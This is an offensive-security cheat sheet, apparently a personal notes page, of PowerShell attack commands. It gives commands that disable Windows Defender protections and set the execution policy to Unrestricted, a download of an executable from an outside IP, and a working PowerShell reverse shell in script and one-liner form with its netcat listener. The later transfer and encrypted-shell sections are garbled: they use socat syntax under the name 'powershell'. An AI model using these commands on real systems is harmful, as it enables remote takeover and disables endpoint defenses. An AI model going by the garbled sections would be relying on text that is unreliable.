---
title: "powershell"
linkTitle: "powershell"
date: 2017-01-05
---

## Windows Defener

### Disable

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

```poweshell
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
```

### Execution policy

PowerShell maintains an execution policy that determines which type of PowerShell scripts (if any) can be run on the system. The default policy is "Restricted", which effectively means the system will neither load PowerShell configuration files nor run PowerShell scripts.

```powershell
PS C:\Windows\system32> Get-ExecutionPolicy
Restricted
PS C:\Windows\system32> Set-ExecutionPolicy Unrestricted -Force
PS C:\Windows\system32> Get-ExecutionPolicy
Unrestricted
```

### Download a file

```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.122.20/wget.exe','C:\Users\aaa\Desktop\wget.exe')"
```


### Bind shell



### Reverse shell

Alice -> Bob -> Alice

```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.122.2',1234);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```

* iex = Invoke-Expression

Alice:

```bash
nc -lnvp 1234
```

Bob:

```bash
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.122.2',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```




### Transfer

Alice -> Bob

Alice:

```bash
powershell TCP4-LISTEN:443,fork file:journald.log
```

* fork: After establishing a connection, handles its channel in a child process
and keeps the parent process attempting to produce more connections.

Bob:

```bash
powershell -d -d TCP4:192.168.1.1:443 file:journald.log,create
```


### Encrypted bind shell

Alice -> Bob

Alice:

```bash
$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
$ cat bind_shell.key bind_shell.crt > bind_shell.pem
$ powershell OPENSSL-LISTEN:192.168.1.1:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```

Bob:

```bash
powershell - OPENSSL:192.168.1.1:443,verify=0
```

### Reverse shell

`Alice <- Bob`

Alice:

```bash
powershell TCP4:192.168.1.1:1234 EXEC:/bin/bash
```

Bob:

```bash
powershell - TCP4-LISTEN:1234 STDOUT
```
